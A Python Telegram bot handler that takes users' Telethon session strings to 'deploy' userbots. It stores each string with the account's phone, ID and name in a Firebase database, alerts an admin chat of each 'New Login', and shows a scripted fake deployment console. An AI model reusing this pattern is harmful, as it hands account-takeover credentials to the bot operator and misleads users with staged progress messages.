from telethon import TelegramClient
from telethon.sessions import StringSession
from session import userbot, users, active_users
import config
import asyncio
import requests
from config import FIREBASE
from config import CHAT_ID



async def clone_handle(client, event):
  text = event.raw_text.strip()  
  parts = text.split(maxsplit=1)  
  command = parts[0]              
  value = parts[1] if len(parts) > 1 else ""  
  
  if not value:
    msg = "<blockquote>Note: Telethon</blockquote>\nProvide Telethon session string after the command."
    await event.respond(msg, parse_mode="html")
    return
  
  if value in active_users:
    await event.reply("This userbot is already running. 🚀")
    return
    
  sent = await event.reply("Deploying your userbot...")
  valid, me = await validate(value)
  
  if not valid:
    await sent.edit("The provided string is not a valid Telethon session string.")
    return
  
  user_id = me.get("user_id")
  first_name = me.get("first_name")
  mention = f'<a href="tg://user?id={user_id}">{first_name}</a>'
  users.setdefault(user_id, me)
  userbot.setdefault("client", []).append(value)
  
  
  for i in range(0, 12):
    if i == 11:
      c = console[10]
      await sent.edit(f"{mention} userbot has started and is running. 🚀", parse_mode="html")
    else:
      pa = progress[i]
      p = i * 10
      c = console[i]
      c_mention = f'<a href="tg://user?id={user_id}">{c}</a>'
      await sent.edit(f"{c_mention}\n\n{pa} {p}%", parse_mode="html")
      await asyncio.sleep(0.5)
  
  me["session"] = value
  database = set_userbot_data(me)
  if not database:
    return
  
  msg = f"<blockquote>New Login</blockquote>Name : {mention}"
  try:
    await client.send_message(CHAT_ID, msg, parse_mode="html")
  except:
    pass
  
  


async def validate(session_str):
  try:
    client = TelegramClient(StringSession(session_str), config.API_ID, config.API_HASH)
    await client.start()
    me = await client.get_me()
    data = {
      "first_name" : me.first_name,
      "user_id" : me.id,
      "username" : me.username,
      "phone" : me.phone
    }
    await client.disconnect()
    return True, data
  except Exception as e:
    return False, e
  
  



def set_userbot_data(data: dict):
  user_id = data.get("user_id")
  if not user_id:
    raise ValueError("user_id is missing in data")
  url = f"{FIREBASE}/userbot/{user_id}.json"
  response = requests.put(url, json=data)
    
  if response.status_code == 200:
    return True
  else:
    return False

progress = [
    "[▒▒▒▒▒▒▒▒▒▒]",
    "[▓▒▒▒▒▒▒▒▒▒]",
    "[▓▓▒▒▒▒▒▒▒▒]",
    "[▓▓▓▒▒▒▒▒▒▒]",
    "[▓▓▓▓▒▒▒▒▒▒]",
    "[▓▓▓▓▓▒▒▒▒▒]",
    "[▓▓▓▓▓▓▒▒▒▒]",
    "[▓▓▓▓▓▓▓▒▒▒]",
    "[▓▓▓▓▓▓▓▓▒▒]",
    "[▓▓▓▓▓▓▓▓▓▒]",
    "[▓▓▓▓▓▓▓▓▓▓]"
]

console = [
    "[INFO]: Started deployment...️",
    "[INFO]: Checking dependencies...",
    "[INFO]: Connecting to server... ",
    "[INFO]: Uploading files...",
    "[INFO]: Configuring environment... ",
    "[INFO]: Starting services...",
    "[INFO]: Running tests...",
    "[INFO]: Finalizing setup...",
    "[INFO]: Reading session files... ️",
    "[INFO]: Securing connections... ",
    "[SUCCESS]: Completed ✅"
]